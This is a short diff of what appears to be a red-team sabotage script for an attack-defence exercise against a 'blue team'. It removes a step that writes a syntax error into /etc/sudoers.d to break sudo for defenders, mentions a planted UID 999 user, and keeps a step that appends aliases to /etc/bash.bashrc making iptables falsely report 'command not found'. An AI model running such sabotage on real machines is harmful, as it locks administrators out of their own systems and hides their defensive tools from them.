@@ -163,10 +163,6 @@ if command -v yum &>/dev/null; then
     done
 fi
 
-# --- Corrupt sudoers (breaks sudo for blue team, our user is in /etc/passwd with UID 999) ---
-# Add a syntax error at the end that breaks visudo parsing
-echo "BROKEN_LINE_HERE %%%%" >> /etc/sudoers.d/zzz-break 2>/dev/null
-
 # --- Alias common admin commands to no-ops ---
 cat >> /etc/bash.bashrc << 'EOF'
 alias iptables='echo "iptables: command not found"'
